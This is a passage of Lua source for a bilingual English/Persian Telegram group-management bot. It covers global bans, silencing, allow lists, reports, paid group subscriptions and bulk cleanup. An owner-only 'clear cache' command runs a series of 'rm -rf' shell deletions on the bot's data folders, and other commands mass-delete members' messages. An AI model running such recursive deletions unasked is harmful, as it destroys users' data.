      if not lang then
        return ErrorAccessSudo(msg)
      else
        return ErrorAccessSudo(msg)
      end
    end
    if not matches[2] and msg.reply_id then
      function UnBanAll(extra, result, success)
        if result.sender_user_id_ then
          user = result.sender_user_id_
          chat = result.chat_id_
          if CheckBotRank(user) then
            return NoAccess(chat)
          end
          if not is_banall(user) then
            return SendStatus(chat, user, "is Not Globall Ban", "\218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134 \217\134\216\168\217\136\216\175")
          end
          redis:srem("BotGloballBanUsers", user)
          return SendStatus(chat, user, "Globall Unbanned", "\216\175\219\140\218\175\217\135 \218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134 \217\134\219\140\216\179\216\170!")
        end
      end
      tdcli_function({
        ID = "GetMessage",
        chat_id_ = msg.to.id,
        message_id_ = msg.reply_to_message_id_
      }, UnBanAll, nil)
    end
    if matches[2] and string.match(matches[2], "^%d+$") then
      local get = function(extra, result, success)
        if result.id_ then
          user = result.id_
          chat = msg.to.id
          if CheckBotRank(user) then
            return NoAccess(msg.to.id)
          end
          if not is_banall(user) then
            return SendStatus(chat, user, "is Not Globall Ban", "\218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134 \217\134\216\168\217\136\216\175")
          end
          redis:srem("BotGloballBanUsers", user)
          return SendStatus(chat, user, "Globall Unbanned", "\216\175\219\140\218\175\217\135 \218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134 \217\134\219\140\216\179\216\170!")
        else
          user = matches[2]
          chat = msg.to.id
          if not redis:sismember("BotGloballBanUsers", user) then
            return SendStatusNotFound(chat, user, "is Not Globall Ban", "\218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134 \217\134\216\168\217\136\216\175")
          else
            redis:srem("BotGloballBanUsers", user)
            return SendStatusNotFound(msg.to.id, user, "Globall Unbanned", "\216\175\219\140\218\175\217\135 \218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134 \217\134\219\140\216\179\216\170!")
          end
        end
      end
      tdcli.getUser(matches[2], get)
    end
    if matches[2] and string.match(matches[2], "^@.*$") then
      function UnBanAll(arg, data)
        if data.id_ then
          user = data.id_
          chat = arg.chat_id
          if CheckBotRank(user) then
            return NoAccess(chat)
          end
          if not is_banall(user) then
            return SendStatus(chat, user, "is Not Globall Ban", "\218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134 \217\134\216\168\217\136\216\175")
          end
          redis:srem("BotGloballBanUsers", user)
          return SendStatus(chat, user, "Globall Unbanned", "\216\175\219\140\218\175\217\135 \218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134 \217\134\219\140\216\179\216\170!")
        else
          user = arg.username
          chat = arg.chat_id
          if not redis:sismember("BotGloballBanUsers", user) then
            return SendStatusNotFound(chat, user, "is Not Globall Ban", "\218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134 \217\134\216\168\217\136\216\175")
          else
            redis:srem("BotGloballBanUsers", user)
            return SendStatusNotFound(chat, user, "Globall Unbanned", "\216\175\219\140\218\175\217\135 \218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134 \217\134\219\140\216\179\216\170!")
          end
        end
      end
      tdcli_function({
        ID = "SearchPublicChat",
        username_ = matches[2]
      }, UnBanAll, {
        chat_id = msg.to.id,
        username = matches[2]
      })
    end
  end
  if msg.to.type ~= "pv" then
    if (matches[1]:lower() == "silent" or matches[1] == "\216\179\218\169\217\136\216\170") and is_mod(msg) then
      if not matches[2] and msg.reply_id then
        tdcli_function({
          ID = "GetMessage",
          chat_id_ = msg.to.id,
          message_id_ = msg.reply_id
        }, action_by_reply_, {
          chat_id = msg.to.id,
          cmd = "silent"
        })
      end
      if matches[2] and string.match(matches[2], "^%d+$") then
        if isModerator(msg.to.id, userid) then
          return NoAccess(msg.to.id)
        end
        if is_silent_user(matches[2], chat) then
          return SendStatus(msg.to.id, matches[2], "Already Silent", "\216\167\216\178 \217\130\216\168\217\132 \216\179\216\167\218\169\216\170 \216\168\217\136\216\175")
        end
        redis:sadd("GroupSilentUsers:" .. msg.to.id, matches[2])
        return SendStatus(msg.to.id, matches[2], "Silented", "\216\179\216\167\218\169\216\170 \216\180\216\175")
      end
      if matches[2] and not string.match(matches[2], "^%d+$") then
        tdcli_function({
          ID = "SearchPublicChat",
          username_ = matches[2]
        }, action_by_username_, {
          chat_id = msg.to.id,
          username = matches[2],
          cmd = "silent"
        })
      end
    end
    if (matches[1]:lower() == "unsilent" or matches[1] == "\216\168\216\177\216\175\216\167\216\180\216\170\217\134 \216\179\218\169\217\136\216\170") and is_mod(msg) then
      if not matches[2] and msg.reply_id then
        tdcli_function({
          ID = "GetMessage",
          chat_id_ = msg.to.id,
          message_id_ = msg.reply_id
        }, action_by_reply_, {
          chat_id = msg.to.id,
          cmd = "unsilent"
        })
      end
      if matches[2] and string.match(matches[2], "^%d+$") then
        if not is_silent_user(matches[2], chat) then
          return SendStatus(msg.to.id, matches[2], "is Not Silent", "\216\179\216\167\218\169\216\170 \217\134\216\168\217\136\216\175")
        end
        redis:srem("GroupSilentUsers:" .. msg.to.id, matches[2])
        return SendStatus(msg.to.id, matches[2], "Unsilented", "\216\175\219\140\218\175\217\135 \216\179\216\167\218\169\216\170 \217\134\219\140\216\179\216\170!")
      end
      if matches[2] and not string.match(matches[2], "^%d+$") then
        tdcli_function({
          ID = "SearchPublicChat",
          username_ = matches[2]
        }, action_by_username_, {
          chat_id = msg.to.id,
          username = matches[2],
          cmd = "unsilent"
        })
      end
    end
    if (matches[1]:lower() == "clean" or matches[1] == "\217\190\216\167\218\169\216\179\216\167\216\178\219\140") and is_owner(msg) then
      if matches[2] == "messages" or matches[2] == "msg" or matches[2] == "msgs" or matches[2] == "\217\190\219\140\216\167\217\133 \217\135\216\167" then
        local rmsg_all = function(arg, data)
          local delall = data.members_
          if not delall[0] then
            if not lang then
              return "*No Members in This Group!*"
            else
              return "\216\167\219\140\217\134 \218\175\216\177\217\136\217\135 \216\185\216\182\217\136\219\140 \217\134\216\175\216\167\216\177\216\175!"
            end
          else
            for k, v in pairs(data.members_) do
              tdcli.deleteMessagesFromUser(msg.chat_id_, v.user_id_)
              RedisUsers = redis:smembers("FixCleanMSG:" .. msg.chat_id_)
              if #RedisUsers ~= 0 then
                for m, n in pairs(RedisUsers) do
                  tdcli.deleteMessagesFromUser(msg.chat_id_, n)
                  redis:srem("FixCleanMSG:" .. msg.chat_id_, n)
                end
              end
            end
          end
        end
        tdcli_function({
          ID = "GetChannelMembers",
          channel_id_ = getChatId(msg.chat_id_).ID,
          offset_ = 0,
          limit_ = 10000
        }, rmsg_all, nil)
      end
      if matches[2] == "tabchi" or matches[2] == "\216\170\216\168\218\134\219\140" then
        local CleanTabchi = function(arg, data)
          local CheckMmbr = data.members_
          if not CheckMmbr[0] then
            if not lang then
              return "*No Members in This Group!*"
            else
              return "\216\167\219\140\217\134 \218\175\216\177\217\136\217\135 \216\185\216\182\217\136\219\140 \217\134\216\175\216\167\216\177\216\175!"
            end
          else
            if not lang then
              tdcli.sendMessage(chat, msg.id_, 0, "*All Members Suspect To Tabchi Has Been Kicked!*", 0, "md")
            else
              tdcli.sendMessage(chat, msg.id_, 0, "\217\135\217\133\217\135 \216\167\216\185\216\182\216\167\219\140 \217\133\216\180\218\169\217\136\218\169 \216\168\217\135 \216\170\216\168\218\134\219\140 \216\167\216\174\216\177\216\167\216\172 \216\180\216\175\217\134\216\175!", 0, "md")
            end
            for k, v in pairs(data.members_) do
              ForwardMessages = tonumber(redis:get("getForwardMessages:" .. v.user_id_ .. ":" .. msg.to.id)) or 0
              LinkMessages = tonumber(redis:get("getLinkMessages:" .. v.user_id_ .. ":" .. msg.to.id)) or 0
              TextMessages = tonumber(redis:get("getTextMessages:" .. v.user_id_ .. ":" .. msg.to.id)) or 0
              if ForwardMessages + LinkMessages > TextMessages * 2 then
                kick_user(v.user_id_, msg.to.id)
                redis:del("getForwardMessages:" .. v.user_id_ .. ":" .. msg.to.id)
                redis:del("getTextMessages:" .. v.user_id_ .. ":" .. msg.to.id)
                redis:del("getLinkMessages:" .. v.user_id_ .. ":" .. msg.to.id)
              end
            end
          end
        end
        tdcli_function({
          ID = "GetChannelMembers",
          channel_id_ = getChatId(msg.chat_id_).ID,
          offset_ = 0,
          limit_ = 10000
        }, CleanTabchi, nil)
      end
      if matches[2] == "\216\167\216\185\216\182\216\167 \216\168\219\140 \217\129\216\167\219\140\216\175\217\135" or matches[2] == "vain" or matches[2] == "\216\168\219\140 \217\129\216\167\219\140\216\175\217\135" then
        redis:setex("CleanVains:" .. msg.to.id .. ":" .. msg.from.id, 300, "w8")
        if not lang then
          return [[
*Warning:* With This Commands All Vain Members Will Be Kicked From Group!
For Continue Type `done` or Cancel Process With `cancel`]]
        else
          return "*\216\167\216\174\216\183\216\167\216\177:* \216\168\216\167 \216\167\217\134\216\172\216\167\217\133 \216\167\219\140\217\134 \216\175\216\179\216\170\217\136\216\177 \216\170\217\133\216\167\217\133 \216\167\216\185\216\182\216\167 \216\168\219\140 \217\129\216\167\219\140\216\175\217\135 \218\175\216\177\217\136\217\135 \216\167\216\174\216\177\216\167\216\172 \216\174\217\136\216\167\217\135\217\134\216\175 \216\180\216\175!\n\216\168\216\177\216\167\219\140 \216\167\216\175\216\167\217\133\217\135 \216\175\216\167\216\175\217\134 `done` \216\177\216\167 \216\170\216\167\219\140\217\190 \218\169\217\134\219\140\216\175 \219\140\216\167 \216\168\216\177\216\167\219\140 \217\132\216\186\217\136 \218\169\216\177\216\175\217\134 \216\167\216\178 `cancel` \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175"
        end
      end
      if matches[2] == "silentlist" or matches[2] == "\217\132\219\140\216\179\216\170 \216\179\218\169\217\136\216\170" then
        GetSilentList = redis:smembers("GroupSilentUsers:" .. msg.to.id)
        if #GetSilentList == 0 then
          if not lang then
            return "*Silent list is empty*"
          else
            return "\217\132\219\140\216\179\216\170 \218\169\216\167\216\177\216\168\216\177\216\167\217\134 \216\179\216\167\218\169\216\170 \216\174\216\167\217\132\219\140 \216\167\216\179\216\170"
          end
        end
        redis:del("GroupSilentUsers:" .. msg.to.id)
        if not lang then
          return "*Silent list* `has been cleaned`"
        else
          return "*\217\132\219\140\216\179\216\170 \218\169\216\167\216\177\216\168\216\177\216\167\217\134 \216\179\216\167\218\169\216\170 \216\180\216\175\217\135 \217\190\216\167\218\169 \216\180\216\175*"
        end
      end
    end
    if (matches[1]:lower() == "clean" or matches[1] == "\217\190\216\167\218\169\216\179\216\167\216\178\219\140") and is_sudo(msg) and (matches[2] == "gbans" or matches[2] == "\218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134") then
      Gbans = redis:smembers("BotGloballBanUsers")
      if #Gbans == 0 then
        if not lang then
          return "Globall Ban List is Empty!"
        else
          return "\217\132\219\140\216\179\216\170 \218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134 \216\174\216\167\217\132\219\140 \217\133\219\140 \216\168\216\167\216\180\216\175!"
        end
      end
      redis:del("BotGloballBanUsers")
      if not lang then
        return "All Globall Ban Users Has Been `Globall Unbanned`"
      else
        return "\216\170\217\133\216\167\217\133 \218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134 \217\135\216\167 \216\167\216\178 \218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134 `\216\174\216\167\216\177\216\172 \216\180\216\175\217\134\216\175`"
      end
    end
    if (matches[1]:lower() == "gbanlist" or matches[1] == "\217\132\219\140\216\179\216\170 \218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134") and is_sudo(msg) then
      return banall_list(msg)
    end
    if msg.to.type ~= "pv" and (matches[1]:lower() == "silentlist" or matches[1] == "\217\132\219\140\216\179\216\170 \216\179\218\169\217\136\216\170") and is_mod(msg) then
      return getsilentlist(chat)
    end
    if is_mod(msg) then
      chat = msg.to.id
      user = msg.from.id
      lang = redis:get("gp_lang:" .. msg.to.id)
      if matches[1]:lower() == "filter" or matches[1] == "\217\129\219\140\217\132\216\170\216\177" then
        return filter_word(msg, matches[2])
      elseif (matches[1]:lower() == "allow" or matches[1] == "\217\133\216\172\216\167\216\178") and not matches[2] and msg.reply_id then
        function allow(extra, result, success)
          user = result.sender_user_id_
          chat = result.chat_id_
          if not redis:sismember("AllowUserFrom~" .. chat, user) then
            redis:sadd("AllowUserFrom~" .. chat, user)
            SendStatus(chat, user, "Added", "\216\167\216\182\216\167\217\129\217\135 \216\180\216\175")
          else
            redis:srem("AllowUserFrom~" .. chat, user)
            SendStatus(chat, user, "Removed", "\216\173\216\176\217\129 \216\180\216\175")
          end
        end
        tdcli_function({
          ID = "GetMessage",
          chat_id_ = msg.to.id,
          message_id_ = msg.reply_to_message_id_
        }, allow, nil)
      elseif (matches[1]:lower() == "allow" or matches[1] == "\217\133\216\172\216\167\216\178") and matches[2] and not matches[2]:match("(%d+)") and matches[2]:match("(.*)") and matches[2]:match("^@") then
        tdcli_function({
          ID = "SearchPublicChat",
          username_ = matches[2]
        }, action_by_username, {
          chat_id = msg.to.id,
          username = matches[2],
          cmd = "allow"
        })
      elseif (matches[1]:lower() == "allow" or matches[1] == "\217\133\216\172\216\167\216\178") and matches[2] and not matches[2]:match("(%d+)") and matches[2]:match("(.*)") and not matches[2]:match("^@") then
        if not redis:get("Allow~" .. matches[2] .. "From~" .. msg.chat_id_) then
          redis:set("Allow~" .. matches[2] .. "From~" .. msg.chat_id_, true)
          redis:sadd("AllowFrom~" .. msg.chat_id_, matches[2])
          if not lang then
            return "*Word:* `" .. matches[2] .. [[
`
*Status:* `Added`]]
          else
            return "*\218\169\217\132\217\133\217\135:* `" .. matches[2] .. "`\n*\217\136\216\182\216\185\219\140\216\170:* `\216\167\216\182\216\167\217\129\217\135 \216\180\216\175`"
          end
        elseif redis:get("Allow~" .. matches[2] .. "From~" .. msg.chat_id_) then
          redis:del("Allow~" .. matches[2] .. "From~" .. msg.chat_id_)
          redis:srem("AllowFrom~" .. msg.chat_id_, matches[2])
          if not lang then
            return "*Word:* `" .. matches[2] .. [[
`
*Status:* `Removed`]]
          else
            return "*\218\169\217\132\217\133\217\135:* `" .. matches[2] .. "`\n*\217\136\216\182\216\185\219\140\216\170:* `\216\173\216\176\217\129 \216\180\216\175`"
          end
        end
      elseif (matches[1]:lower() == "allow" or matches[1] == "\217\133\216\172\216\167\216\178") and matches[2] and matches[2]:match("(%d+)") then
        if not redis:sismember("AllowUserFrom~" .. msg.to.id, matches[2]) then
          redis:sadd("AllowUserFrom~" .. msg.to.id, matches[2])
          return SendStatus(msg.to.id, matches[2], "Added", "\216\167\216\182\216\167\217\129\217\135 \216\180\216\175")
        else
          redis:srem("AllowUserFrom~" .. msg.to.id, matches[2])
          return SendStatus(msg.to.id, matches[2], "Removed", "\216\173\216\176\217\129 \216\180\216\175")
        end
      elseif matches[1]:lower() == "allowlist" or matches[1] == "\217\132\219\140\216\179\216\170 \217\133\216\172\216\167\216\178" then
        hashWord = "AllowFrom~" .. msg.to.id
        listWord = redis:smembers(hashWord)
        hashUser = "AllowUserFrom~" .. msg.to.id
        listUser = redis:smembers(hashUser)
        if not lang then
          textWord = [[
*> Allow words:*

]]
          textUser = [[
*> Allow users:*

]]
        else
          textWord = "*> \217\132\216\186\216\167\216\170 \217\133\216\172\216\167\216\178:*\n\n"
          textUser = "*> \216\167\216\180\216\174\216\167\216\181 \217\133\216\172\216\167\216\178:*\n\n"
        end
        for k, v in pairs(listWord) do
          textWord = textWord .. "*" .. k .. "-* " .. v .. [[


]]
        end
        for k, v in pairs(listUser) do
          textUser = textUser .. "*" .. k .. "-* `" .. v .. [[
`

]]
        end
        if #listWord == 0 then
          if not lang then
            textWord = [[
*> Allow words not found!*

]]
          else
            textWord = "*> \217\132\216\186\216\167\216\170 \217\133\216\172\216\167\216\178 \219\140\216\167\217\129\216\170 \217\134\216\180\216\175\217\134\216\175!*\n\n"
          end
        end
        if #listUser == 0 then
          if not lang then
            textUser = [[
*> Allow users not found!*

]]
          else
            textUser = "*> \216\167\216\180\216\174\216\167\216\181 \217\133\216\172\216\167\216\178 \219\140\216\167\217\129\216\170 \217\134\216\180\216\175\217\134\216\175!*\n\n"
          end
        end
        tdcli.sendMessage(msg.to.id, msg.id_, 0, textWord .. "" .. textUser, 0, "md")
      end
      if is_sudo(msg) and (matches[1]:lower() == "reload" or matches[1] == "\216\177\219\140\217\132\217\136\216\175") then
        reload_plugins(true, msg)
        return "\216\167\217\134\216\172\216\167\217\133 \216\180\216\175"
      end
      if matches[1]:lower() == "report" or matches[1] == "\218\175\216\178\216\167\216\177\216\180" then
        function report(extra, result, success)
          local hash = "reportlist" .. msg.to.id
          if lang then
            redis:sadd(hash, "*\216\162\219\140\216\175\219\140* [" .. msg.from.id .. "] *\218\169\216\167\216\177\216\168\216\177 \217\133\217\130\216\167\216\168\217\132 \216\177\216\167 \218\175\216\178\216\167\216\177\216\180 \216\175\216\167\216\175* [" .. result.sender_user_id_ .. "]. *\217\133\216\170\217\134:* [" .. result.content_.text_ .. "]")
            tdcli.sendMessage(result.chat_id_, msg.id_, 0, "*\218\175\216\178\216\167\216\177\216\180 \216\180\217\133\216\167 \216\171\216\168\216\170 \218\175\216\177\216\175\217\138\216\175!*", 0, "md")
          else
            redis:sadd(hash, "*ID* [`" .. msg.from.id .. "`] *has been reported* [`" .. result.sender_user_id_ .. "`]. *Text:* [" .. result.content_.text_ .. "]")
            tdcli.sendMessage(result.chat_id_, msg.id_, 0, "*Your report has been saved!*", 0, "md")
          end
        end
        tdcli_function({
          ID = "GetMessage",
          chat_id_ = msg.to.id,
          message_id_ = msg.reply_to_message_id_
        }, report, nil)
      end
      if (matches[1]:lower() == "reportlist" or matches[1] == "\217\132\219\140\216\179\216\170 \218\175\216\178\216\167\216\177\216\180") and is_mod(msg) then
        local hash = "reportlist" .. msg.to.id
        local list = redis:smembers(hash)
        if lang then
          text = "*> \217\132\217\138\216\179\216\170 \217\190\217\138\216\167\217\133 \217\135\216\167\217\138 \218\175\216\178\216\167\216\177\216\180 \216\180\216\175\217\135:*\n\n"
        else
          text = [[
*> Report list:*

]]
        end
        for k, v in pairs(list) do
          text = "*" .. text .. k .. "-* " .. v .. [[
 

]]
        end
        if #list == 0 then
          if lang then
            text = "*> \217\132\219\140\216\179\216\170 \216\177\219\140\217\190\217\136\216\177\216\170 \216\174\216\167\217\132\219\140 \216\167\216\179\216\170!*"
          else
            text = "*> Report list is empty!*"
          end
        end
        tdcli.sendMessage(msg.to.id, msg.id_, 0, text, 0, "md")
      end
      if (matches[1]:lower() == "clean reportlist" or matches[1] == "\217\190\216\167\218\169\216\179\216\167\216\178\219\140 \217\132\219\140\216\179\216\170 \218\175\216\178\216\167\216\177\216\180") and is_owner(msg) then
        redis:del("reportlist" .. msg.to.id)
        if lang then
          tdcli.sendMessage(msg.to.id, msg.id_, 0, "*\217\132\219\140\216\179\216\170 \218\175\216\178\216\167\216\177\216\180 \216\168\216\167 \217\133\217\136\217\129\217\130\219\140\216\170 \217\190\216\167\218\169 \216\180\216\175!*", 0, "md")
        else
          tdcli.sendMessage(msg.to.id, msg.id_, 0, "*Report list has been cleaned!*", 0, "md")
        end
      end
      if (matches[1]:lower() == "helpme" or matches[1] == "\216\177\216\167\217\135\217\134\217\133\216\167\219\140\219\140") and is_owner(msg) then
        text = [[
*New message! 
Chat:* `]] .. msg.to.id .. [[
`
*From*: ]] .. msg.from.print_name .. " [`" .. msg.from.id .. [[
`]
*Message:*
]] .. matches[2]
        for v, owner in pairs(_config.bot_owner) do
          local SUDO = tonumber(owner)
          tdcli.sendMessage(SUDO, 0, 1, text, 1, "md")
        end
        if not lang then
          return "*Your Message has been sent for bots owner!*"
        else
          return "*\217\190\219\140\216\167\217\133 \216\180\217\133\216\167 \216\168\216\177\216\167\219\140 \216\181\216\167\216\173\216\168 \216\177\216\168\216\167\216\170 \216\167\216\177\216\179\216\167\217\132 \216\180\216\175!*"
        end
      end
      if is_botOwner(msg) then
        if matches[1]:lower() == "clear cache" then
          run_bash("rm -rf ~/.telegram-cli/data/sticker/*")
          run_bash("rm -rf ~/.telegram-cli/data/photo/*")
          run_bash("rm -rf ~/.telegram-cli/data/animation/*")
          run_bash("rm -rf ~/.telegram-cli/data/video/*")
          run_bash("rm -rf ~/.telegram-cli/data/audio/*")
          run_bash("rm -rf ~/.telegram-cli/data/voice/*")
          run_bash("rm -rf ~/.telegram-cli/data/temp/*")
          run_bash("rm -rf ~/.telegram-cli/data/thumb/*")
          run_bash("rm -rf ~/.telegram-cli/data/document/*")
          run_bash("rm -rf ~/.telegram-cli/data/profile_photo/*")
          run_bash("rm -rf ~/.telegram-cli/data/encrypted/*")
          return "\216\167\217\134\216\172\216\167\217\133 \216\180\216\175"
        end
        if matches[1]:lower() == "delsudo" or matches[1] == "\216\173\216\176\217\129 \216\179\217\136\216\175\217\136" then
          if not matches[2] and msg.reply_id then
            tdcli_function({
              ID = "GetMessage",
              chat_id_ = msg.to.id,
              message_id_ = msg.reply_id
            }, action_by_reply2, {
              chat_id = msg.to.id,
              cmd = "delsudo"
            })
          end
          if matches[2] and string.match(matches[2], "^%d+$") then
            tdcli_function({
              ID = "GetUser",
              user_id_ = matches[2]
            }, action_by_id2, {
              chat_id = msg.to.id,
              user_id = matches[2],
              cmd = "delsudo"
            })
          end
          if matches[2] and not string.match(matches[2], "^%d+$") then
            tdcli_function({
              ID = "SearchPublicChat",
              username_ = matches[2]
            }, action_by_username2, {
              chat_id = msg.to.id,
              username = matches[2],
              cmd = "delsudo"
            })
          end
        end
      end
      if is_sudo(msg) then
        if (matches[1]:lower() == "charge" or matches[1] == "\216\180\216\167\216\177\218\152") and matches[2]:match("-%d+") and matches[3] then
          if not redis:sismember("SudoAccess" .. msg.from.id, "changecharge") and not is_botOwner(msg) then
            if not lang then
              return ErrorAccessSudo(msg)
            else
              return ErrorAccessSudo(msg)
            end
          end
          if 0 < tonumber(matches[3]) and 1000 > tonumber(matches[3]) then
            redis:setex("ExpireDate:" .. matches[2], tonumber(matches[3]) * 86400, true)
            redis:set("CheckExpire:" .. matches[2], true)
            redis:setex("WaitForChangeCharge:" .. msg.from.id .. ":" .. msg.to.id, 300, matches[2])
            if lang then
              return "\216\180\216\167\216\177\218\152 \218\175\216\177\217\136\217\135 " .. matches[2] .. " \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175 \216\168\217\135 `" .. matches[3] .. "` \216\177\217\136\216\178\n\216\162\219\140\216\167 \217\133\219\140\216\174\217\136\216\167\217\135\219\140\216\175 \217\190\219\140\216\167\217\133 \216\170\216\186\219\140\219\140\216\177 \216\180\216\167\216\177\218\152 \216\168\217\135 \218\175\216\177\217\136\217\135 \217\133\217\136\216\177\216\175\217\134\216\184\216\177 \216\167\216\177\216\179\216\167\217\132 \216\180\217\136\216\175\216\159 (`1` \216\168\216\177\216\167\219\140 \216\170\216\167\219\140\219\140\216\175 \217\136 `0` \216\168\216\177\216\167\219\140 \217\132\216\186\217\136)"
            else
              return "*Groups* " .. matches[2] .. " *Charge Changed To* `" .. matches[3] .. [[
` *Day*
Would You Like To Send a Message For Change Charge To Group? (`1` To Confirm And `0` To Cancel)]]
            end
          elseif 1000 <= tonumber(matches[3]) then
            redis:setex("ExpireDate:" .. matches[2], tonumber(matches[3]) * 86400, true)
            redis:set("CheckExpire:" .. matches[2], "unlimited")
            redis:setex("WaitForChangeCharge:" .. msg.from.id .. ":" .. msg.to.id, 300, matches[2])
            if lang then
              return "\216\180\216\167\216\177\218\152 \218\175\216\177\217\136\217\135 " .. matches[2] .. " \217\134\216\167\217\133\216\173\216\175\217\136\216\175 \216\180\216\175\n\216\162\219\140\216\167 \217\133\219\140\216\174\217\136\216\167\217\135\219\140\216\175 \217\190\219\140\216\167\217\133 \216\170\216\186\219\140\219\140\216\177 \216\180\216\167\216\177\218\152 \216\168\217\135 \218\175\216\177\217\136\217\135 \217\133\217\136\216\177\216\175\217\134\216\184\216\177 \216\167\216\177\216\179\216\167\217\132 \216\180\217\136\216\175\216\159 (`1` \216\168\216\177\216\167\219\140 \216\170\216\167\219\140\219\140\216\175 \217\136 `0` \216\168\216\177\216\167\219\140 \217\132\216\186\217\136)"
            else
              return "*Groups* " .. matches[2] .. [[
 *Charge Unlimited*
Would You Like To Send a Message For Change Charge To Group? (`1` To Confirm And `0` To Cancel)]]
            end
          end
        end
        if matches[1] == "+" and (matches[2]:lower() == "charge" or matches[2] == "\216\180\216\167\216\177\218\152") then
          if not redis:sismember("SudoAccess" .. msg.from.id, "changecharge") and not is_botOwner(msg) then
            if not lang then
              return ErrorAccessSudo(msg)
            else
              return ErrorAccessSudo(msg)
            end
          end
          if 0 <= tonumber(matches[3]) then
            BotGroups = redis:smembers("BotGroups")
            NumberOFBotGroups = redis:scard("BotGroups")
            if #BotGroups == 0 then
              if not lang then
                return "*Bot Group List is Empty!*"
              else
                return "\217\132\219\140\216\179\216\170 \218\175\216\177\217\136\217\135 \216\177\216\168\216\167\216\170 \216\174\216\167\217\132\219\140 \216\167\216\179\216\170!"
              end
            end
            if not lang then
              txt = "`" .. matches[3] .. "` *Days Charge Were Added For* `" .. NumberOFBotGroups .. "` *Groups*"
            else
              txt = "`" .. matches[3] .. "` \216\177\217\136\216\178 \216\180\216\167\216\177\218\152 \216\168\217\135 `" .. NumberOFBotGroups .. "` \216\170\216\167 \218\175\216\177\217\136\217\135 \216\167\216\182\216\167\217\129\217\135 \216\180\216\175"
            end
            tdcli.sendMessage(msg.to.id, msg.id_, 0, txt, 0, "md")
            for k, v in pairs(BotGroups) do
              GroupExpire = tonumber(redis:ttl("ExpireDate:" .. v)) or "err"
              if GroupExpire ~= "err" then
                GroupDays = math.ceil(GroupExpire / 86400)
                InputTime = tonumber(GroupDays) + tonumber(matches[3])
                GroupTime = tonumber(InputTime) * 86400
                redis:setex("ExpireDate:" .. v, GroupTime, true)
              end
            end
          end
        end
        if matches[1] == "-" and (matches[2]:lower() == "charge" or matches[2] == "\216\180\216\167\216\177\218\152") then
          if not redis:sismember("SudoAccess" .. msg.from.id, "changecharge") and not is_botOwner(msg) then
            if not lang then
              return ErrorAccessSudo(msg)
            else
              return ErrorAccessSudo(msg)
            end
          end
          if 0 <= tonumber(matches[3]) then
            BotGroups = redis:smembers("BotGroups")
            NumberOFBotGroups = redis:scard("BotGroups")
            if #BotGroups == 0 then
              if not lang then
                return "*Bot Group List is Empty!*"
              else
                return "\217\132\219\140\216\179\216\170 \218\175\216\177\217\136\217\135 \216\177\216\168\216\167\216\170 \216\174\216\167\217\132\219\140 \216\167\216\179\216\170!"
              end
            end
            if not lang then
              txt = "`" .. matches[3] .. "` *Days Charge Were Reduced From* `" .. NumberOFBotGroups .. "` *Groups*"
            else
              txt = "`" .. matches[3] .. "` \216\177\217\136\216\178 \216\180\216\167\216\177\218\152 \216\167\216\178 `" .. NumberOFBotGroups .. "` \216\170\216\167 \218\175\216\177\217\136\217\135 \218\169\216\167\217\135\216\180 \219\140\216\167\217\129\216\170"
            end
            tdcli.sendMessage(msg.to.id, msg.id_, 0, txt, 0, "md")
            for k, v in pairs(BotGroups) do
              GroupExpire = tonumber(redis:ttl("ExpireDate:" .. v)) or "err"
              if GroupExpire ~= "err" then
                GroupDays = math.ceil(GroupExpire / 86400)
                InputTime = tonumber(GroupDays) - tonumber(matches[3])
                if 0 <= InputTime then
                  GroupTime = tonumber(InputTime) * 86400
                  redis:setex("ExpireDate:" .. v, GroupTime, true)
                end
              end
            end
          end
        end
      end
      if msg.to.type == "channel" then
        if (matches[1]:lower() == "charge" or matches[1] == "\216\180\216\167\216\177\218\152") and matches[2] and not matches[3] and is_sudo(msg) then
          if not redis:sismember("SudoAccess" .. msg.from.id, "changecharge") and not is_botOwner(msg) then
            if not lang then
              return ErrorAccessSudo(msg)
            else
              return ErrorAccessSudo(msg)
            end
          end
          if 0 < tonumber(matches[2]) and tonumber(matches[2]) < 1000 then
            redis:setex("ExpireDate:" .. msg.to.id, tonumber(matches[2]) * 86400, true)
            redis:set("CheckExpire:" .. msg.to.id, true)
            for v, owner in pairs(_config.bot_owner) do
              if msg.from.username then
                UserName = "@" .. msg.from.username
              else
                UserName = msg.from.first_name
              end
              tdcli.sendMessage(tonumber(owner), 0, 1, "\216\167\216\175\217\133\219\140\217\134 " .. UserName .. " \216\168\216\167 \216\162\219\140\216\175\219\140 `" .. msg.from.id .. "` \218\175\216\177\217\136\217\135\219\140 \216\168\216\167 \216\167\216\183\217\132\216\167\216\185\216\167\216\170 \216\178\219\140\216\177 \216\177\216\167 \216\168\217\135 \217\133\216\175\216\170 `" .. matches[2] .. "` \216\177\217\136\216\178 \216\180\216\167\216\177\218\152 \218\169\216\177\216\175:\n\216\162\219\140\216\175\219\140 \218\175\216\177\217\136\217\135: `" .. msg.to.id .. "`\n\217\134\216\167\217\133 \218\175\216\177\217\136\217\135: " .. UseMark(msg.to.title), 1, "md")
            end
            if lang then
              return "\216\180\216\167\216\177\218\152 \216\167\219\140\217\134 \218\175\216\177\217\136\217\135 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175 \216\168\217\135 `" .. matches[2] .. "` \216\177\217\136\216\178"
            else
              return "*Groups Charge Changed To* `" .. matches[2] .. "` *Day*"
            end
          elseif tonumber(matches[2]) >= 1000 then
            redis:setex("ExpireDate:" .. msg.to.id, tonumber(matches[2]) * 86400, true)
            redis:set("CheckExpire:" .. msg.to.id, "unlimited")
            for v, owner in pairs(_config.bot_owner) do
              if msg.from.username then
                UserName = "@" .. msg.from.username
              else
                UserName = msg.from.first_name
              end
